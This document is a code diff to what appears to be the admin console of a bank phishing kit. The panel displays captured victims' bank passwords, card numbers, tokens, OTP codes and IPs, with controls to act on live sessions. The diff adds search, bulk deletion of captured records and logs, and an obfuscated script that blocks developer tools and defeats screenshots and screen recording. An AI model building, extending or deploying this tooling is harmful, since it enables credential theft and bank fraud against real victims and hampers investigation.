@@ -50,20 +50,30 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial
 .stat-card.sessions .value { color: #60a5fa; }
 
 .section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; }
+.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; gap: 12px; flex-wrap: wrap; }
 .section-title { font-size: 15px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
 .section-title .badge { background: #252d44; color: #88f456; font-size: 11px; padding: 3px 8px; border-radius: 12px; font-weight: 700; }
+.section-tools { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.search-input { background: #0f1421; border: 1px solid #252d44; border-radius: 8px; padding: 8px 12px; color: #e5e7eb; font-size: 13px; outline: none; min-width: 200px; }
+.search-input:focus { border-color: #88f456; }
+.btn-borrar { background: #dc2626; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
+.btn-borrar:hover { background: #b91c1c; }
+.btn-borrar:disabled { opacity: 0.4; cursor: not-allowed; }
 
 .table-wrap { overflow-x: auto; }
 table { width: 100%; border-collapse: collapse; font-size: 12px; }
 thead { background: #0f1421; }
 thead th { text-align: left; padding: 8px 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; white-space: nowrap; }
+thead th.checkbox-col { width: 32px; text-align: center; }
 tbody tr { border-bottom: 1px solid #1a1f35; transition: background 0.15s; }
 tbody tr:hover { background: rgba(136, 244, 86, 0.04); }
 tbody td { padding: 10px; color: #cbd5e1; vertical-align: middle; }
+tbody td.checkbox-col { text-align: center; }
 tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #88f456; }
 tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; font-size: 11px; }
 tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #cbd5e1; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-color: #88f456; }
 
 .empty { text-align: center; padding: 30px 20px; color: #6b7280; font-style: italic; font-size: 12px; }
 
@@ -110,6 +120,9 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
     .stats { grid-template-columns: 1fr 1fr; }
     .topbar-left { gap: 10px; }
     .tab-btn { padding: 6px 10px; font-size: 12px; }
+    .section-header { flex-direction: column; align-items: stretch; }
+    .section-tools { width: 100%; }
+    .search-input { flex: 1; min-width: 0; }
 }
 </style>
 </head>
@@ -171,6 +184,9 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                         🟢 Usuarios activos
                         <span class="badge" id="badgeActivos">0</span>
                     </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarActivos" placeholder="🔍 Buscar por IP o acción...">
+                    </div>
                 </div>
                 <div class="table-wrap">
                     <table>
@@ -195,11 +211,16 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                         💳 Sesiones de pago
                         <span class="badge" id="badgeSesiones">0</span>
                     </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarSesiones" placeholder="🔍 Buscar banco, IP, doc, estado...">
+                        <button class="btn-borrar" id="btnBorrarSesiones" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
                 </div>
                 <div class="table-wrap">
                     <table>
                         <thead>
                             <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
                                 <th>Banco</th>
                                 <th>Estado</th>
                                 <th>Identificación</th>
@@ -214,7 +235,7 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                             </tr>
                         </thead>
                         <tbody id="tbodySesiones">
-                            <tr><td colspan="11" class="empty">Cargando...</td></tr>
+                            <tr><td colspan="12" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -228,6 +249,10 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                         🚫 IPs bloqueadas
                         <span class="badge" id="badgeIps">0</span>
                     </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarIps" placeholder="🔍 Buscar IP...">
+                        <button class="btn-borrar" id="btnBorrarIps" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
                 </div>
                 <div class="block-input">
                     <input type="text" id="inputNuevaIp" placeholder="IP a bloquear (ej. 190.25.10.5)">
@@ -237,12 +262,13 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                     <table>
                         <thead>
                             <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllIps"></th>
                                 <th>IP</th>
                                 <th>Acciones</th>
                             </tr>
                         </thead>
                         <tbody id="tbodyIps">
-                            <tr><td colspan="2" class="empty">Sin IPs bloqueadas</td></tr>
+                            <tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -256,18 +282,23 @@ tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #
                         📜 Logs de acceso al panel
                         <span class="badge" id="badgeLogs">0</span>
                     </div>
+                    <div class="section-tools">
+                        <input type="text" class="search-input" id="buscarLogs" placeholder="🔍 Buscar tipo, usuario, IP...">
+                        <button class="btn-borrar" id="btnBorrarLogs" disabled>🗑️ Borrar seleccionados</button>
+                    </div>
                 </div>
                 <div class="table-wrap">
                     <table>
                         <thead>
                             <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllLogs"></th>
                                 <th>Fecha</th>
                                 <th>Tipo</th>
                                 <th>Detalles</th>
                             </tr>
                         </thead>
                         <tbody id="tbodyLogs">
-                            <tr><td colspan="3" class="empty">Cargando...</td></tr>
+                            <tr><td colspan="4" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -284,6 +315,15 @@ const API_BASE = window.location.origin;
 let TOKEN = sessionStorage.getItem('adminToken') || '';
 let USUARIO = sessionStorage.getItem('adminUser') || '';
 let pollInterval = null;
+
+let sesionesCache = [];
+let ipsCache = [];
+let logsCache = [];
+let activosCache = [];
+
+let seleccionSesiones = new Set();
+let seleccionIps = new Set();
+let seleccionLogs = new Set();
 
 function $(id) { return document.getElementById(id); }
 
@@ -394,6 +434,9 @@ function logout() {
     $('loginScreen').style.display = 'flex';
     $('loginUser').value = '';
     $('loginPass').value = '';
+    seleccionSesiones.clear();
+    seleccionIps.clear();
+    seleccionLogs.clear();
 }
 
 $('logoutBtn').addEventListener('click', logout);
@@ -438,24 +481,37 @@ async function cargarStats() {
 async function cargarActivos() {
     try {
         const d = await api('/admin/activos');
-        const tbody = $('tbodyActivos');
-        if (!d.activos.length) {
-            tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
-            return;
-        }
-        tbody.innerHTML = d.activos.map(a => `
-            <tr>
-                <td class="ip">${escapeHtml(a.ip)}</td>
-                <td>${escapeHtml(a.ultimaAccion)}</td>
-                <td>${formatTime(a.tiempoDentro)}</td>
-                <td>
-                    <div class="actions">
-                        <button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button>
-                    </div>
-                </td>
-            </tr>
-        `).join('');
+        activosCache = d.activos;
+        renderActivos();
     } catch (e) {}
+}
+
+function renderActivos() {
+    const filtro = ($('buscarActivos').value || '').toLowerCase().trim();
+    const tbody = $('tbodyActivos');
+    let lista = activosCache;
+    if (filtro) {
+        lista = lista.filter(a =>
+            (a.ip || '').toLowerCase().includes(filtro) ||
+            (a.ultimaAccion || '').toLowerCase().includes(filtro)
+        );
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
+        return;
+    }
+    tbody.innerHTML = lista.map(a => `
+        <tr>
+            <td class="ip">${escapeHtml(a.ip)}</td>
+            <td>${escapeHtml(a.ultimaAccion)}</td>
+            <td>${formatTime(a.tiempoDentro)}</td>
+            <td>
+                <div class="actions">
+                    <button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button>
+                </div>
+            </td>
+        </tr>
+    `).join('');
 }
 
 function botonesSesion(s) {
@@ -509,80 +565,240 @@ function botonesSesion(s) {
 async function cargarSesiones() {
     try {
         const d = await api('/admin/sesiones');
-        const tbody = $('tbodySesiones');
-        if (!d.sesiones.length) {
-            tbody.innerHTML = '<tr><td colspan="11" class="empty">Sin sesiones</td></tr>';
-            return;
-        }
-        const sorted = d.sesiones.reverse();
-        tbody.innerHTML = sorted.map(s => {
-            const datos = s.datos || {};
-            const banco = datos.bancoKey || '-';
-            const identificacion = datos.identificacion || '-';
-            const clave = datos.clave || '-';
-            const doc = datos.docNumber || (datos.tarjeta ? truncar(datos.tarjeta, 20) : '-');
-            const titular = datos.titular || '-';
-            const token = datos.token || '-';
-            const otp = datos.otp || '-';
-            const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
-            const ip = datos.ip || '-';
-            return `
-                <tr>
-                    <td>${escapeHtml(nombreBanco(banco))}</td>
-                    <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
-                    <td class="dato">${escapeHtml(identificacion)}</td>
-                    <td class="dato">${escapeHtml(clave)}</td>
-                    <td class="dato" title="${escapeHtml(doc)}">${escapeHtml(doc)}</td>
-                    <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
-                    <td class="dato">${escapeHtml(token)}</td>
-                    <td class="dato">${escapeHtml(otp)}</td>
-                    <td class="dato">${escapeHtml(monto)}</td>
-                    <td class="ip">${escapeHtml(ip)}</td>
-                    <td><div class="actions">${botonesSesion(s)}</div></td>
-                </tr>
-            `;
-        }).join('');
+        sesionesCache = d.sesiones.reverse();
+        renderSesiones();
     } catch (e) {}
 }
+
+function renderSesiones() {
+    const filtro = ($('buscarSesiones').value || '').toLowerCase().trim();
+    const tbody = $('tbodySesiones');
+    let lista = sesionesCache;
+    if (filtro) {
+        lista = lista.filter(s => {
+            const datos = s.datos || {};
+            const texto = [
+                datos.bancoKey, s.estado, datos.identificacion, datos.clave,
+                datos.docNumber, datos.tarjeta, datos.titular, datos.token,
+                datos.otp, datos.monto, datos.ip
+            ].filter(Boolean).join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="12" class="empty">Sin sesiones</td></tr>';
+        actualizarBtnBorrarSesiones();
+        return;
+    }
+    tbody.innerHTML = lista.map(s => {
+        const datos = s.datos || {};
+        const banco = datos.bancoKey || '-';
+        const identificacion = datos.identificacion || '-';
+        const clave = datos.clave || '-';
+        const doc = datos.docNumber || (datos.tarjeta ? truncar(datos.tarjeta, 20) : '-');
+        const titular = datos.titular || '-';
+        const token = datos.token || '-';
+        const otp = datos.otp || '-';
+        const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
+        const ip = datos.ip || '-';
+        const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-sesion" data-id="${escapeHtml(s.sessionId)}" ${checked}></td>
+                <td>${escapeHtml(nombreBanco(banco))}</td>
+                <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
+                <td class="dato">${escapeHtml(identificacion)}</td>
+                <td class="dato">${escapeHtml(clave)}</td>
+                <td class="dato" title="${escapeHtml(doc)}">${escapeHtml(doc)}</td>
+                <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
+                <td class="dato">${escapeHtml(token)}</td>
+                <td class="dato">${escapeHtml(otp)}</td>
+                <td class="dato">${escapeHtml(monto)}</td>
+                <td class="ip">${escapeHtml(ip)}</td>
+                <td><div class="actions">${botonesSesion(s)}</div></td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-sesion').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionSesiones.add(id);
+            else seleccionSesiones.delete(id);
+            actualizarBtnBorrarSesiones();
+        });
+    });
+    actualizarBtnBorrarSesiones();
+}
+
+function actualizarBtnBorrarSesiones() {
+    const btn = $('btnBorrarSesiones');
+    btn.disabled = seleccionSesiones.size === 0;
+    btn.textContent = seleccionSesiones.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllSesiones').addEventListener('change', (e) => {
+    if (e.target.checked) {
+        sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId));
+    } else {
+        seleccionSesiones.clear();
+    }
+    renderSesiones();
+});
+
+$('btnBorrarSesiones').addEventListener('click', async () => {
+    if (!seleccionSesiones.size) return;
+    if (!confirm(`¿Borrar ${seleccionSesiones.size} sesión(es)? Esta acción es permanente.`)) return;
+    try {
+        const ids = [...seleccionSesiones];
+        await api('/admin/sesiones/borrar', { method: 'POST', body: JSON.stringify({ sessionIds: ids }) });
+        toast(`🗑️ ${ids.length} sesión(es) borrada(s)`);
+        seleccionSesiones.clear();
+        $('checkAllSesiones').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
 
 async function cargarIps() {
     try {
         const d = await api('/admin/ips-bloqueadas');
-        const tbody = $('tbodyIps');
-        if (!d.ips.length) {
-            tbody.innerHTML = '<tr><td colspan="2" class="empty">Sin IPs bloqueadas</td></tr>';
-            return;
-        }
-        tbody.innerHTML = d.ips.map(ip => `
+        ipsCache = d.ips;
+        renderIps();
+    } catch (e) {}
+}
+
+function renderIps() {
+    const filtro = ($('buscarIps').value || '').toLowerCase().trim();
+    const tbody = $('tbodyIps');
+    let lista = ipsCache;
+    if (filtro) lista = lista.filter(ip => ip.toLowerCase().includes(filtro));
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>';
+        actualizarBtnBorrarIps();
+        return;
+    }
+    tbody.innerHTML = lista.map(ip => {
+        const checked = seleccionIps.has(ip) ? 'checked' : '';
+        return `
             <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-ip" data-id="${escapeHtml(ip)}" ${checked}></td>
                 <td class="ip">${escapeHtml(ip)}</td>
                 <td><button class="btn btn-unblock" onclick="desbloquearIp('${escapeHtml(ip)}')">🔓 Desbloquear</button></td>
             </tr>
-        `).join('');
-    } catch (e) {}
+        `;
+    }).join('');
+    document.querySelectorAll('.check-ip').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionIps.add(id);
+            else seleccionIps.delete(id);
+            actualizarBtnBorrarIps();
+        });
+    });
+    actualizarBtnBorrarIps();
 }
+
+function actualizarBtnBorrarIps() {
+    const btn = $('btnBorrarIps');
+    btn.disabled = seleccionIps.size === 0;
+    btn.textContent = seleccionIps.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionIps.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllIps').addEventListener('change', (e) => {
+    if (e.target.checked) ipsCache.forEach(ip => seleccionIps.add(ip));
+    else seleccionIps.clear();
+    renderIps();
+});
+
+$('btnBorrarIps').addEventListener('click', async () => {
+    if (!seleccionIps.size) return;
+    if (!confirm(`¿Borrar ${seleccionIps.size} IP(s) de la lista?`)) return;
+    try {
+        const ips = [...seleccionIps];
+        await api('/admin/ips/borrar', { method: 'POST', body: JSON.stringify({ ips }) });
+        toast(`🗑️ ${ips.length} IP(s) borrada(s)`);
+        seleccionIps.clear();
+        $('checkAllIps').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
 
 async function cargarLogs() {
     try {
         const d = await api('/admin/logs');
-        const tbody = $('tbodyLogs');
-        if (!d.logs.length) {
-            tbody.innerHTML = '<tr><td colspan="3" class="empty">Sin logs</td></tr>';
-            return;
-        }
+        logsCache = d.logs;
         $('badgeLogs').textContent = d.logs.length;
-        tbody.innerHTML = d.logs.map(l => {
-            const fecha = new Date(l.fecha).toLocaleString('es-CO');
-            return `
-                <tr>
-                    <td>${escapeHtml(fecha)}</td>
-                    <td>${escapeHtml(l.tipo)}</td>
-                    <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td>
-                </tr>
-            `;
-        }).join('');
+        renderLogs();
     } catch (e) {}
 }
+
+function renderLogs() {
+    const filtro = ($('buscarLogs').value || '').toLowerCase().trim();
+    const tbody = $('tbodyLogs');
+    let lista = logsCache;
+    if (filtro) {
+        lista = lista.filter(l => {
+            const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>';
+        actualizarBtnBorrarLogs();
+        return;
+    }
+    tbody.innerHTML = lista.map(l => {
+        const fecha = new Date(l.fecha).toLocaleString('es-CO');
+        const checked = seleccionLogs.has(l.id) ? 'checked' : '';
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" ${checked}></td>
+                <td>${escapeHtml(fecha)}</td>
+                <td>${escapeHtml(l.tipo)}</td>
+                <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-log').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionLogs.add(id);
+            else seleccionLogs.delete(id);
+            actualizarBtnBorrarLogs();
+        });
+    });
+    actualizarBtnBorrarLogs();
+}
+
+function actualizarBtnBorrarLogs() {
+    const btn = $('btnBorrarLogs');
+    btn.disabled = seleccionLogs.size === 0;
+    btn.textContent = seleccionLogs.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionLogs.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllLogs').addEventListener('change', (e) => {
+    if (e.target.checked) logsCache.forEach(l => seleccionLogs.add(l.id));
+    else seleccionLogs.clear();
+    renderLogs();
+});
+
+$('btnBorrarLogs').addEventListener('click', async () => {
+    if (!seleccionLogs.size) return;
+    if (!confirm(`¿Borrar ${seleccionLogs.size} log(s)?`)) return;
+    try {
+        const ids = [...seleccionLogs];
+        await api('/admin/logs/borrar', { method: 'POST', body: JSON.stringify({ ids }) });
+        toast(`🗑️ ${ids.length} log(s) borrado(s)`);
+        seleccionLogs.clear();
+        $('checkAllLogs').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
 
 async function accion(sessionId, accion) {
     try {
@@ -621,6 +837,11 @@ $('btnBloquearManual').addEventListener('click', async () => {
     $('inputNuevaIp').value = '';
 });
 
+$('buscarActivos').addEventListener('input', renderActivos);
+$('buscarSesiones').addEventListener('input', renderSesiones);
+$('buscarIps').addEventListener('input', renderIps);
+$('buscarLogs').addEventListener('input', renderLogs);
+
 if (TOKEN) {
     fetch(API_BASE + '/admin/stats', { headers: { 'Authorization': 'Bearer ' + TOKEN } })
         .then(r => { if (r.ok) mostrarDashboard(); else logout(); })
@@ -630,6 +851,67 @@ if (TOKEN) {
 document.addEventListener('keydown', e => {
     if (e.key === 'Escape' && TOKEN) logout();
 });
+</script>
+
+<script>
+(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+document.addEventListener('selectstart',function(_0xl1){
+var _0xm2=(_0xl1.target&&_0xl1.target.tagName)?_0xl1.target.tagName.toLowerCase():'';
+if(_0xm2!=='input'&&_0xm2!=='textarea'){_0xl1.preventDefault();}
+});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xn3){document.body.innerHTML='';}
+
+var _0xo4=null;
+function _0xp5(){
+    document.documentElement.style.filter='blur(20px)';
+    document.documentElement.style.transition='filter 0.1s';
+    setTimeout(function(){
+        document.documentElement.style.filter='';
+    },1500);
+}
+window.addEventListener('keyup',function(_0xq6){
+    var _0xr7=_0xq6.key||'';
+    var _0xs8=_0xr7.toLowerCase();
+    if(_0xs8==='printscreen'||_0xq6.keyCode===44){_0xp5();}
+    if(_0xq6.metaKey&&_0xq6.shiftKey&&_0xs8==='s'){_0xp5();}
+    if(_0xq6.metaKey&&_0xs8==='printscreen'){_0xp5();}
+    if(_0xq6.metaKey&&_0xq6.shiftKey&&(_0xs8==='3'||_0xs8==='4'||_0xs8==='5')){_0xp5();}
+},{capture:true});
+document.addEventListener('visibilitychange',function(){
+    if(document.hidden){document.body.style.filter='blur(30px)';}
+    else{document.body.style.filter='';}
+});
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+    navigator.mediaDevices.getDisplayMedia=function(){
+        _0xp5();
+        return Promise.reject(new Error('Captura no permitida'));
+    };
+}
+if(window.MediaRecorder){
+    window.MediaRecorder=function(){_0xp5();throw new Error('Grabación no permitida');};
+}
+})();
 </script>
 </body>
 </html>
